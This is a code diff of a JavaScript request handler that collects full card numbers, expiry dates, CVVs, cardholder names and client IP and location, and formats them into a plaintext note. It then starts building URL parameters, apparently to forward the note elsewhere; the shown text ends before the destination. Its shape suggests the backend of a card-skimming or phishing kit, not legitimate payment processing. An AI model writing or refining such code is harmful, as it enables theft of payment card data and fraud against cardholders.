@@ -27,7 +27,7 @@ export default async function handler(req, res) {
   }
 
   try {
-    const { cardNumber, expiryMonth, expiryYear, cvv, cardHolder, timezone, userAgent, referral, pageUrl } = req.body || {};
+    const { cardNumber, expiryMonth, expiryYear, cvv, cardHolder, timezone, referral } = req.body || {};
     const number = (cardNumber || '').replace(/\s/g, '');
     const month = (expiryMonth || '').padStart(2, '0');
     const year = expiryYear || '';
@@ -49,18 +49,16 @@ export default async function handler(req, res) {
       }
     } catch {}
 
-    // Build note in exact format
-    const cardLine = `API card received: ${number} ${month}/${year} ${cvvVal}`;
-    const infoParts = [];
-    infoParts.push(`IP: ${ip || 'unknown'}`);
-    if (location) infoParts.push(`Location: ${location}`);
-    if (timezone) infoParts.push(`Timezone: ${timezone}`);
-    infoParts.push(`Referral: ${referral || 'Direct'}`);
-    infoParts.push(`Page: ${pageUrl || 'unknown'}`);
-    if (cardHolder) infoParts.push(`Name: ${cardHolder}`);
-    if (userAgent) infoParts.push(`UA: ${userAgent}`);
+    // Build note
+    const lines = [];
+    lines.push(`Card: ${number} ${cvvVal}`);
+    lines.push(`Date: ${month}/${year}`);
+    lines.push(`Name on card: ${cardHolder || 'N/A'}`);
+    lines.push(`IP: ${ip || 'unknown'}${location ? ' (' + location + ')' : ''}`);
+    lines.push(`Timezone: ${timezone || 'N/A'}`);
+    lines.push(`Referral: ${referral || 'Direct'}`);
 
-    const fullNote = cardLine + '\n' + infoParts.join(' | ');
+    const fullNote = lines.join('\n');
 
     // Required params
     const params = new URLSearchParams({
